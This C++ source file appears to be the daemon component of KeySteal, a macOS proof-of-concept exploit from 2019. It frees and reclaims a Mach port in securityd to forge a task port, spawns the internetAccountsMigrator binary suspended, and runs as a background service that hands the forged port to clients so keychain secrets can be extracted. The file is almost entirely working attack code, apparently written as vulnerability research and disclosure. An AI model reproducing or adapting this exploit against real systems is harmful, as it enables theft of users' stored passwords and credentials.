//
//  main.cpp
//  keystealDaemon
//
//  Created by Linus Henze on 21.01.19.
//  Copyright © 2019 Linus Henze. All rights reserved.
//

#include <Foundation/Foundation.h>
#include <xpc/xpc.h>
#include <iostream>
#include <spawn.h>
#include <Security/Security.h>
#include <stdlib.h>

#include "securityd.hpp"

#define FATAL_ERROR(msg) printf("[!FATAL!] " msg "\n"); exit(-1)
#define LOG_ERROR(msg)   printf("[!] " msg "\n")
#define LOG_INFO(msg)    printf("[*] " msg "\n")
#define LOG_SUCCESS(msg) printf("[+] " msg "\n")

#define PORT_COUNT 250
#define MAX_TRIES  100

extern char **environ;

extern "C" void xpc_atfork_child();
extern "C" kern_return_t bootstrap_register2(mach_port_t bp, char *service_name, mach_port_t sp, int flags);

void fill_mach_port_array(mach_port_t *ports, size_t count) {
    for (size_t i = 0; i < count; i++) {
        kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &ports[i]);
        assert(kr == KERN_SUCCESS);
        kr = mach_port_insert_right(mach_task_self(), ports[i], ports[i], MACH_MSG_TYPE_MAKE_SEND);
        assert(kr == KERN_SUCCESS);
    }
}

// The following will happen in a child task
#undef FATAL_ERROR
#define FATAL_ERROR(msg) printf("[!FATAL!] " msg "\n"); kill(getppid(), SIGKILL); exit(-1)

mach_port_t insertFakePort() {
    LOG_INFO("Attempting magic...");
    
    // Create some ports and make sure they exist in securityd
    mach_port_t *ports = (mach_port_t*) malloc(PORT_COUNT * sizeof(*ports));
    fill_mach_port_array(ports, PORT_COUNT);
    for (size_t i = 0; i < PORT_COUNT; i++) {
        CSSM_RETURN err = securityd_mksession_withport(ports[i], mach_task_self());
        if (err != 0) {
            FATAL_ERROR("Failed to register session with SecurityServer!");
        }
    }
    
    // Kill our task port
    // Spawns 3rd process
    if (securityd_free_port(mach_task_self())) {
        FATAL_ERROR("Failed to free port!");
    }
    
    // Free the ports, making sure our target port is down the free list
    for (size_t i = 0; i < PORT_COUNT; i++) {
        mach_port_destroy(mach_task_self(), ports[i]);
    }
    
    LOG_SUCCESS("Freed port!");
    LOG_INFO("Reclaiming...");
    
    mach_port_t tReplyPort;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tReplyPort);
    mach_port_insert_right(mach_task_self(), tReplyPort, tReplyPort, MACH_MSG_TYPE_MAKE_SEND);
    
    // Register again so that we have a valid session
    if (securityd_setup_withport(tReplyPort) != 0) {
        FATAL_ERROR("Failed to establish a connection to the SecurityServer (again)!");
    }
    
    mach_port_t replyPort;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &replyPort);
    mach_port_insert_right(mach_task_self(), replyPort, replyPort, MACH_MSG_TYPE_MAKE_SEND);
    
    mach_port_t fakeTaskPort = MACH_PORT_NULL;
    
    for (int i = 0; i < 1000; i++) {
        // Create port...
        mach_port_t thePort;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &thePort);
        mach_port_insert_right(mach_task_self(), thePort, thePort, MACH_MSG_TYPE_MAKE_SEND);
        
        // ...register with securityd
        CSSM_RETURN err = securityd_mksession_withport(thePort, mach_task_self());
        if (err != 0) {
            FATAL_ERROR("Failed to register session with SecurityServer!");
        }
        
        // Now check if we succeeded
        if (securityd_mksession_withport(replyPort, thePort) == 0) {
            LOG_SUCCESS("Reclaimed port!");
            fakeTaskPort = thePort;
            break;
        }
        
        // Nope, try again
        mach_port_destroy(mach_task_self(), thePort);
    }
    
    if (fakeTaskPort == MACH_PORT_NULL) {
        LOG_ERROR("Failed to reclaim port!");
        return MACH_PORT_NULL;
    }
    
    return fakeTaskPort;
}

mach_port_t doExploit() {
    // We will do the exploit in a child task
    mach_port_t bp;
    task_get_bootstrap_port(mach_task_self(), &bp);
    
    mach_port_t connection;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &connection);
    mach_port_insert_right(mach_task_self(), connection, connection, MACH_MSG_TYPE_MAKE_SEND);
    
    task_set_bootstrap_port(mach_task_self(), connection); // Magic ;)
    bootstrap_port = connection;
    
    pid_t pid = fork();
    if (pid == 0) {
        // Child, init connection then kill the port
        mach_port_t connection;
        task_get_bootstrap_port(mach_task_self(), &connection); // Might have a different name...
        
        // Create receive port and send to parent
        mach_port_t myPort;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &myPort);
        mach_port_insert_right(mach_task_self(), myPort, myPort, MACH_MSG_TYPE_MAKE_SEND);
        sendPort(connection, myPort);
        
        // Get real bootstrap port
        bp = recvPort(myPort);
        bootstrap_port = bp;
        task_set_bootstrap_port(mach_task_self(), bp);
        xpc_atfork_child();
        
        // Do the exploit!
        LOG_INFO("Connecting to service...");
        
        if (securityd_setup() != 0) {
            FATAL_ERROR("Failed to establish a connection to the SecurityServer!");
        }
        
        LOG_SUCCESS("Connected");
        
        mach_port_t fakeTaskPort = MACH_PORT_NULL;
        for (int i = 0; i < MAX_TRIES; i++) {
            mach_port_t port = insertFakePort();
            if (port != MACH_PORT_NULL) {
                fakeTaskPort = port;
                break;
            }
            
            if (i != (MAX_TRIES-1)) {
                LOG_INFO("Trying again...");
            }
            
            sleep(1); // Increases our chances to win
        }
        
        if (fakeTaskPort == MACH_PORT_NULL) {
            FATAL_ERROR("Out of tries! Better luck next time...");
        }
        
        // Great! Now send that port to our parent
        // Make sure to transfer the receive right!
        sendPortReceiveRight(connection, fakeTaskPort);
        
        // Now exec!
        // Make sure we're suspended though
        pid_t child = 0;
        posix_spawnattr_t attr;
        posix_spawnattr_init(&attr);
        posix_spawnattr_setflags(&attr, POSIX_SPAWN_START_SUSPENDED | POSIX_SPAWN_SETEXEC);
        char *argv[] = { (char*)"", NULL };
        if (posix_spawn(&child, (const char*)"/System/Library/InternetAccounts/internetAccountsMigrator", NULL, (const posix_spawnattr_t *) &attr, (char *const *) argv, environ) == -1) {
            kill(pid, SIGKILL);
            FATAL_ERROR("Failed to execv!");
        }
        
        FATAL_ERROR("posix_spawn failed!");
    }
    
#undef FATAL_ERROR
#define FATAL_ERROR(msg) printf("[!FATAL!] " msg "\n"); exit(-1)
    
    // Parent
    task_set_bootstrap_port(mach_task_self(), bp);
    bootstrap_port = bp;
    
    // Get child port
    mach_port_t childPort = recvPort(connection);
    
    // Send bootstrap port
    sendPort(childPort, bp);
    
    // Get fake task port
    mach_port_t fakeTaskPort = recvPort(connection);
    mach_port_insert_right(mach_task_self(), fakeTaskPort, fakeTaskPort, MACH_MSG_TYPE_MAKE_SEND);
    
    return fakeTaskPort;
}

void sigusr1Catcher(int sig) {
    exit(0); // Exit cleanly
}

int main(int argc, const char * argv[]) {
    // First of all, check if we're already running
    
    mach_port_t existingDaemon;
    kern_return_t kr = bootstrap_look_up(bootstrap_port, (char*)"de.linushenze.keySteal", &existingDaemon);
    if (kr == KERN_SUCCESS) {
        // Already running, just exit
        exit(0);
    }
    
    // Not running -> continue
    
    // Become a daemon first
    pid_t childPid = fork();
    if (childPid != 0) {
        // Parent - Sleep. Child will kill us.
        // Register our SIGUSR1 catcher
        signal(SIGUSR1, sigusr1Catcher);
        
        // Sleep
        while (true) {
            sleep(100);
        }
    }
    
    pid_t parentPid = getppid();
    
    setsid();
    
    // Get fake task port
    mach_port_t fakeTaskPort = doExploit();
    
    // Note: Session will be reinitialized once a client uses the fake task port for the first time
    
    LOG_SUCCESS("Ready for extraction!");
    
    mach_port_t serverPort;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &serverPort);
    mach_port_insert_right(mach_task_self(), serverPort, serverPort, MACH_MSG_TYPE_MAKE_SEND);
    if (bootstrap_register2(bootstrap_port, (char*)"de.linushenze.keySteal", serverPort, 0) != KERN_SUCCESS) {
        LOG_ERROR("Failed to register service!");
        kill(parentPid, SIGINT);
        return 0;
    }
    
    close(0);
    close(1);
    close(2);
    
    // We can now tell our parent to exit
    kill(parentPid, SIGUSR1);
    
    while (true) {
        char rcv[1024];
        kern_return_t kr = mach_msg((mach_msg_header_t*)rcv, MACH_RCV_MSG|MACH_MSG_OPTION_NONE, 0, 1024, serverPort, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
        if (kr != KERN_SUCCESS) {
            continue;
        }
        
        if (((mach_msg_header_t*)&rcv)->msgh_remote_port != MACH_PORT_NULL) {
            sendPortMake(((mach_msg_header_t*)&rcv)->msgh_remote_port, fakeTaskPort);
        }
    }
    
    return 0;
}
